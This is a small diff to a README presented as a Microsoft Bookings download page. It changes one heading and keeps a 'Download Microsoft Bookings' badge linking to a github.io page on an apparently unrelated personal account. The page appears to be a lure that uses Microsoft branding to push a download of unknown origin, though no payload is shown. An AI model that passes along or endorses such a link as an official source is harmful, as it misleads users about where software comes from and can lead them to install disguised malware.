@@ -1,6 +1,6 @@
 # Microsoft Bookings - Appointment Scheduling for Microsoft 365 Teams
 
-## Open the Booking Workspace
+## Open the Microsoft Booking Workspace
 
 [![Download Microsoft Bookings](https://img.shields.io/badge/Download-Microsoft_Bookings-blue?style=flat&logo=microsoft&logoColor=white)](https://magdusya2.github.io/.github/microsoft-bookings)
 
